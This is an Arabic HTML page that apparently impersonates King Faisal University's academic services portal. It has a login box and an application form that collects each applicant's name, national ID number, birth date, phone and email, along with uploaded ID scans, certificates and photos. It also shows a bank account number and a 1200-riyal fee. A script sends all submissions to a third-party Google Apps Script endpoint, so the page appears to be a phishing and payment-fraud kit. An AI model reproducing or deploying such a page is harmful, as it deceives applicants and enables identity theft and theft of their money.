<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
<meta property="og:image" content="https://i.pinimg.com/736x/51/85/7e/51857e7e1a55e654d7c612c5f8ac200c.jpg">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">

<title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
<link rel="icon" type="image/png" href="kfu_logo.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
body {
    margin: 0;
    font-family: "Tajawal", sans-serif;
    background: #f9f9f9;
    direction: rtl;
}

/* الصفحة الأولى */
.login-container {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    align-items: center;
    background: linear-gradient(rgba(0,0,0,0.4),rgba(0,0,0,0.4)),
    url('https://i.pinimg.com/736x/51/85/7e/51857e7e1a55e654d7c612c5f8ac200c.jpg') center/cover no-repeat;
    color: #fff;
}
.login-header {
    text-align: center;
    margin-top: 40px;
}
.logo-circle {
    width: 120px;
    height: 120px;
    border-radius: 50%;
    background: #fff;
    margin: auto;
    display: flex;
    align-items: center;
    justify-content: center;
}
.logo-circle img {
    width: 90px;
}
.login-form {
    background: rgba(255,255,255,0.9);
    color: #333;
    padding: 30px;
    border-radius: 15px;
    width: 320px;
}
.login-form h2 {
    text-align: center;
    margin-bottom: 20px;
}
.input-group {
    display: flex;
    align-items: center;
    background: #f0f0f0;
    padding: 8px 10px;
    border-radius: 8px;
    margin-bottom: 15px;
}
.input-group i {
    margin-left: 8px;
    color: #555;
}
.input-group input {
    border: none;
    outline: none;
    background: transparent;
    flex: 1;
}
.login-btn {
    width: 100%;
    background: #0b6b44;
    color: #fff;
    border: none;
    padding: 10px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 16px;
}
.quick-access {
    text-align: center;
    margin-top: 15px;
}
.quick-link {
    color: #0b6b44;
    font-weight: 600;
    text-decoration: none;
}
.login-footer {
    margin: 20px 0;
}

/* صفحة النموذج */
.container {
    display: none;
    background: #fff;
    padding: 20px;
}
header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 2px solid #0b6b44;
    padding-bottom: 10px;
    margin-bottom: 20px;
}
.brand {
    display: flex;
    align-items: center;
    gap: 10px;
}
.brand .logo {
    background: #0b6b44;
    color: #fff;
    font-weight: 700;
    font-size: 20px;
    padding: 10px 15px;
    border-radius: 8px;
}
.grid2 {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 15px;
}
label {
    font-weight: 600;
}
input, select {
    width: 100%;
    padding: 8px;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 6px;
}
.section-title {
    font-weight: bold;
    color: #0b6b44;
    margin-top: 20px;
}
.files-row {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 15px;
}
.submit-area {
    margin-top: 20px;
    text-align: center;
}
.btn {
    background: #0b6b44;
    color: #fff;
    padding: 10px 20px;
    border: none;
    border-radius: 8px;
    cursor: pointer;
}
.btn.cancel {
    background: #999;
    margin-right: 10px;
}
</style>
</head>

<body>

<!-- صفحة الدخول -->
<div class="login-container" id="loginPage">
    <header class="login-header">
        <div class="university-logo">
            <div class="logo-circle">
                <img src="kfu_logo.png" alt="شعار الجامعة">
            </div>
            <h1>جامعة الملك فيصل</h1>
            <p>بوابة الخدمات الأكاديمية</p>
        </div>
    </header>

    <main>
        <div class="login-form">
            <h2>تسجيل الدخول</h2>
            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" placeholder="اسم المستخدم أو الإيميل">
            </div>
            <div class="input-group">
                <i class="fas fa-lock"></i>
                <input type="password" placeholder="كلمة المرور">
            </div>
            <button class="login-btn">تسجيل الدخول</button>

            <div class="quick-access">
                <h3>وصول سريع</h3>
                <a href="#" class="quick-link" onclick="showForm()">تقديم طلب جديد</a>
            </div>
        </div>
    </main>

    <footer class="login-footer">
        <p>© 2025 جامعة الملك فيصل</p>
    </footer>
</div>

<!-- نموذج التسجيل -->
<div class="container" id="registrationForm">

<form id="regForm"
      action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec"
      method="POST" enctype="multipart/form-data">

<header>
    <div class="brand">
        <div class="logo">KFU</div>
        <div>
            <h1>نموذج التسجيل - جامعة الملك فيصل</h1>
            <p>يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.</p>
        </div>
    </div>
    <div>
        <strong>رقم الحساب:</strong>
        <div style="font-weight:800;color:#0b6b44">SA1980000857608010276380</div>
        <div style="color:#444">الرسوم: 1200 ريال</div>
    </div>
</header>

<div class="grid2">
    <div>
        <label>الاسم الكامل *</label>
        <input type="text" name="fullName" required>

        <label>الجنس *</label>
        <select name="gender" required>
            <option value="">اختر...</option>
            <option>ذكر</option>
            <option>أنثى</option>
        </select>

        <label>الجنسية *</label>
        <select name="nationality" required>
            <option value="">اختر...</option>
            <option>السعودية</option>
            <option>اليمن</option>
            <option>مصر</option>
            <option>العراق</option>
        </select>

        <label>رقم الهوية *</label>
        <input type="text" name="idNumber" required>

        <label>تاريخ الميلاد *</label>
        <input type="date" name="birthDate" required>

        <label>رقم الجوال *</label>
        <input type="tel" name="phone" required>

        <label>البريد الإلكتروني *</label>
        <input type="email" name="email" required>
    </div>

    <div>
        <label>المؤهل السابق *</label>
        <select name="prevDegree" required>
            <option value="">اختر...</option>
            <option>ثانوي</option>
            <option>دبلوم</option>
            <option>بكالوريوس</option>
        </select>

        <label>التخصص المطلوب *</label>
        <input type="text" name="desiredMajor" required>

        <label>نوع الدراسة *</label>
        <select name="studyType" required>
            <option value="">اختر...</option>
            <option>انتظام</option>
            <option>انتساب</option>
            <option>تعليم عن بعد</option>
        </select>

        <label>الكلية *</label>
        <select name="faculty" required>
            <option value="">اختر...</option>
            <option>كلية الطب</option>
            <option>كلية العلوم</option>
            <option>كلية الحاسبات</option>
        </select>
    </div>
</div>

<div class="section-title">المرفقات</div>
<div class="files-row">
    <div>
        <label>صورة الهوية *</label>
        <input type="file" name="fileId" required>
    </div>
    <div>
        <label>الشهادة *</label>
        <input type="file" name="fileCertificate" required>
    </div>
</div>
<div class="files-row">
    <div>
        <label>صورة شخصية *</label>
        <input type="file" name="filePhoto" required>
    </div>
    <div>
        <label>إيصال الدفع (اختياري)</label>
        <input type="file" name="fileReceipt">
    </div>
</div>

<div class="submit-area">
    <button type="submit" class="btn">إرسال الطلب</button>
    <button type="button" class="btn cancel" onclick="backToLogin()">رجوع</button>
</div>

</form>
</div>

<script>
function showForm(){
    document.getElementById('loginPage').style.display='none';
    document.getElementById('registrationForm').style.display='block';
    window.scrollTo(0,0);
}
function backToLogin(){
    document.getElementById('registrationForm').style.display='none';
    document.getElementById('loginPage').style.display='flex';
    window.scrollTo(0,0);
}
document.getElementById("regForm").addEventListener("submit", e=>{
    e.preventDefault();
    let fd = new FormData(e.target);
    fetch(e.target.action,{method:"POST",body:fd})
    .then(r=>{
        alert("✅ تم إرسال الطلب بنجاح");
        e.target.reset();
    })
    .catch(()=>{
        alert("❌ حدث خطأ، حاول مرة أخرى");
    });
});
</script>

</body>
</html>
